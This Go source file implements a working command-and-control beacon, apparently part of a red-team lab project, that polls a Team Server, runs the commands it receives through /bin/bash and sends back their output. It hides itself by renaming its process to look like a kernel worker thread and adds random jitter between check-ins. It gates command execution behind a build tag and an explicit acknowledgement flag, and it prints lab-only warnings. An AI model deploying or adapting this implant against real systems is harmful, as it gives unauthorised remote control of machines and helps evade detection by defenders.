//go:build lab

// This file holds the working Lab Beacon. The build tag stops the compiler
// from building it by accident.
//
// Build it with:
//
//	go build -tags lab ./lab/beacon-impl
//
// The Makefile target "make lab-beacon" runs that command. See docs/LAB.md for
// the full procedure.
//
// The binary also needs the flag -i-run-remote-commands before it runs a
// command. Without the flag it checks in, it registers, and it returns every
// task with an error. A build tag alone is not enough.
package main

import (
	"bytes"
	"context"
	crand "crypto/rand"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"math/rand/v2"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/had-nu/Go-ServerC2-Payload/internal/c2proto"
	"github.com/had-nu/Go-ServerC2-Payload/internal/opslinux"
	"github.com/had-nu/Go-ServerC2-Payload/internal/transport"
)

// MaskName is the name that the Beacon writes to the kernel. docs/IOC.md lists
// it as an indicator of compromise.
const MaskName = "[kworker/u4:2]"

// Shell is the interpreter that runs a command.
const Shell = "/bin/bash"

// ErrNotArmed is returned for every task while the binary runs without the
// acknowledgement flag. The Beacon still checks in and still registers, so that
// an operator can see that the Beacon is alive.
var ErrNotArmed = errors.New("this beacon is not armed; start it with -i-run-remote-commands")

// AckFlag is the flag that arms the binary. The name states the action.
const AckFlag = "i-run-remote-commands"

type config struct {
	armed        bool
	serverURL    string
	secretFile   string
	caFile       string
	sleep        time.Duration
	jitterPct    float64
	timeout      time.Duration
	maskName     string
	noSpoof      bool
	verbose      bool
	once         bool
	shellTimeout time.Duration
}

func main() {
	cfg := parseFlags()
	if err := run(cfg); err != nil {
		fmt.Fprintf(os.Stderr, "beacon: %v\n", err)
		os.Exit(1)
	}
}

func parseFlags() config {
	var cfg config
	flag.BoolVar(&cfg.armed, AckFlag, false,
		"acknowledge that this beacon runs the commands that a remote client sends")
	flag.StringVar(&cfg.serverURL, "server", "https://127.0.0.1:8443", "Team Server base URL")
	flag.StringVar(&cfg.secretFile, "secret-file", defaultSecretPath(), "path to the shared secret")
	flag.StringVar(&cfg.caFile, "ca", "", "path to the Team Server certificate; the default verifies nothing")
	flag.DurationVar(&cfg.sleep, "sleep", 10*time.Second, "base interval between two check-ins")
	flag.Float64Var(&cfg.jitterPct, "jitter", 20, "largest change to the interval, in percent")
	flag.DurationVar(&cfg.timeout, "timeout", 5*time.Second, "limit on one HTTP request")
	flag.StringVar(&cfg.maskName, "mask-name", MaskName, "name that the Beacon writes to the kernel")
	flag.BoolVar(&cfg.noSpoof, "no-spoof", false, "keep the real process name")
	flag.BoolVar(&cfg.verbose, "verbose", false, "print each check-in to the standard output")
	flag.BoolVar(&cfg.once, "once", false, "run one check-in and stop")
	flag.DurationVar(&cfg.shellTimeout, "shell-timeout", 60*time.Second, "limit on one command")
	flag.Parse()
	if flag.NArg() > 0 {
		fmt.Fprintf(os.Stderr, "beacon: unexpected argument %q\n", flag.Arg(0))
		flag.Usage()
		os.Exit(2)
	}
	return cfg
}

const warningNotArmed = `beacon: NOT ARMED.

This binary checks in and registers, but it refuses every command.

It refuses because the flag -` + AckFlag + ` is absent. Pass that flag only
against a Team Server that you started yourself, in a lab that you control.

Read docs/LAB.md first.`

const armedNotice = `beacon: ARMED. This process runs the commands that the Team Server sends.
Confirm that the server is yours and that the machine is a lab you control.`

func run(cfg config) error {
	if !cfg.armed {
		fmt.Fprintln(os.Stderr, warningNotArmed)
	} else {
		fmt.Fprintln(os.Stderr, armedNotice)
	}
	u, err := url.Parse(cfg.serverURL)
	if err != nil || u.Host == "" {
		return fmt.Errorf("the server URL %q is not valid", cfg.serverURL)
	}
	if u.Scheme != "https" && u.Scheme != "http" {
		return fmt.Errorf("the server URL %q must use http or https", cfg.serverURL)
	}
	secret, err := transport.LoadSecret(cfg.secretFile)
	if err != nil {
		return err
	}
	agentID, err := newAgentID()
	if err != nil {
		return err
	}
	hostname, _ := os.Hostname()

	client, err := newClient(cfg)
	if err != nil {
		return err
	}

	if !cfg.noSpoof {
		if err := opslinux.SetProcessName(cfg.maskName); err != nil {
			fmt.Fprintf(os.Stderr, "beacon: the process name was not changed: %v\n", err)
		}
	}

	b := &beacon{
		cfg:      cfg,
		armed:    cfg.armed,
		client:   client,
		secret:   secret,
		agentID:  agentID,
		hostname: hostname,
	}
	fmt.Fprintf(os.Stderr, "beacon: id=%s host=%s server=%s\n", agentID, hostname, cfg.serverURL)
	return b.loop()
}

type beacon struct {
	cfg      config
	armed    bool
	client   *http.Client
	secret   string
	agentID  string
	hostname string
}

func (b *beacon) loop() error {
	for {
		task, err := b.checkIn(context.Background())
		switch {
		case err != nil:
			b.logf("check-in failed: %v", err)
		case task != nil:
			b.runTask(context.Background(), *task)
		}

		if b.cfg.once {
			return nil
		}
		time.Sleep(b.sleepDuration())
	}
}

func (b *beacon) sleepDuration() time.Duration {
	limit := b.cfg.sleep.Seconds() * b.cfg.jitterPct / 100
	offset := (rand.Float64()*2 - 1) * limit
	// math/rand/v2 needs no seed. The global source of math/rand is random at
	// start-up, and rand.Seed does nothing after Go 1.24.
	return time.Duration(b.cfg.sleep.Seconds()+offset) * time.Second
}

func (b *beacon) logf(format string, args ...any) {
	if !b.cfg.verbose {
		return
	}
	fmt.Fprintf(os.Stdout, "[*] "+format+"\n", args...)
}

func (b *beacon) checkIn(ctx context.Context) (*c2proto.Task, error) {
	ctx, cancel := context.WithTimeout(ctx, b.cfg.timeout)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, http.MethodGet, b.cfg.serverURL+"/checkin", nil)
	if err != nil {
		return nil, err
	}
	b.setHeaders(req)

	resp, err := b.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer drainAndClose(resp)

	if resp.StatusCode == http.StatusNoContent {
		return nil, nil
	}
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("the Team Server returned %d", resp.StatusCode)
	}

	body, err := io.ReadAll(io.LimitReader(resp.Body, transport.MaxRequestBody))
	if err != nil {
		return nil, err
	}
	var task c2proto.Task
	if err := json.Unmarshal(body, &task); err != nil {
		return nil, fmt.Errorf("decode the task: %w", err)
	}
	if err := c2proto.ValidateTaskID(task.TaskID); err != nil {
		return nil, fmt.Errorf("the Team Server sent a bad task ID: %w", err)
	}
	b.logf("task %s received: %s", task.TaskID, task.Command)
	return &task, nil
}

func (b *beacon) runTask(ctx context.Context, task c2proto.Task) {
	// The second gate. A binary built with the tag but started without the
	// acknowledgement flag reaches this point and stops here.
	if !b.armed {
		b.logf("task %s refused: the beacon is not armed", task.TaskID)
		b.postResults(ctx, c2proto.Result{TaskID: task.TaskID, Error: ErrNotArmed.Error()})
		return
	}

	b.logf("running task %s", task.TaskID)
	ctx, cancel := context.WithTimeout(ctx, b.cfg.shellTimeout)
	defer cancel()

	var stdout, stderr bytes.Buffer
	cmd := exec.CommandContext(ctx, Shell, "-c", task.Command) // #nosec G204 -- a C2 runs the command that the operator sends. The Team Server is the only source, and it requires the shared secret.
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	runErr := cmd.Run()
	result := c2proto.Result{TaskID: task.TaskID, Output: truncate(stdout.String(), transport.MaxRequestBody)}
	if runErr != nil {
		result.Error = firstNonEmpty(stderr.String(), runErr.Error())
	}
	b.postResults(ctx, result)
}

func (b *beacon) postResults(ctx context.Context, result c2proto.Result) {
	data, err := json.Marshal(result)
	if err != nil {
		b.logf("encode the result: %v", err)
		return
	}

	// The first version of this Beacon ignored the status code, so a failed
	// send looked like a successful one and the loop stopped early.
	var lastErr error
	for attempt := 1; attempt <= 3; attempt++ {
		if err := b.sendOnce(ctx, data); err == nil {
			return
		} else {
			lastErr = err
		}
		if attempt < 3 {
			time.Sleep(2 * time.Second)
		}
	}
	b.logf("the result was not sent after 3 attempts: %v", lastErr)
}

func (b *beacon) sendOnce(ctx context.Context, data []byte) error {
	ctx, cancel := context.WithTimeout(ctx, b.cfg.timeout)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, b.cfg.serverURL+"/results", bytes.NewReader(data))
	if err != nil {
		return err
	}
	b.setHeaders(req)
	req.Header.Set("Content-Type", "application/json")

	resp, err := b.client.Do(req)
	if err != nil {
		return err
	}
	drainAndClose(resp)

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("the Team Server returned %d", resp.StatusCode)
	}
	return nil
}

func (b *beacon) setHeaders(req *http.Request) {
	req.Header.Set(c2proto.HeaderAuth, "Bearer "+b.secret)
	req.Header.Set(c2proto.HeaderAgentID, b.agentID)
	req.Header.Set(c2proto.HeaderHostname, b.hostname)
}

func newClient(cfg config) (*http.Client, error) {
	tlsCfg, err := transport.NewClientTLS(cfg.caFile)
	if err != nil {
		return nil, err
	}
	return &http.Client{
		Timeout: cfg.timeout,
		Transport: &http.Transport{
			TLSClientConfig:     tlsCfg,
			MaxIdleConns:        4,
			IdleConnTimeout:     30 * time.Second,
			TLSHandshakeTimeout: cfg.timeout,
		},
	}, nil
}

func newAgentID() (string, error) {
	var buf [16]byte
	if _, err := crand.Read(buf[:]); err == nil {
		return fmt.Sprintf("%x-%x-%x-%x-%x", buf[0:4], buf[4:6], buf[6:8], buf[8:10], buf[10:16]), nil
	}
	return fmt.Sprintf("fallback-%d", time.Now().UnixNano()), nil
}

func drainAndClose(resp *http.Response) {
	io.Copy(io.Discard, io.LimitReader(resp.Body, 4096)) // #nosec G104 -- the body is drained so that the connection can be reused
	resp.Body.Close()                                    // #nosec G104 -- Close on a response body has no useful error to return
}

func truncate(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max] + "\n[truncated]"
}

func firstNonEmpty(values ...string) string {
	for _, v := range values {
		if strings.TrimSpace(v) != "" {
			return v
		}
	}
	return ""
}

func defaultSecretPath() string {
	home, err := os.UserHomeDir()
	if err != nil {
		return "c2.key"
	}
	return filepath.Join(home, ".local", "share", "go-serverc2-payload", "c2.key")
}
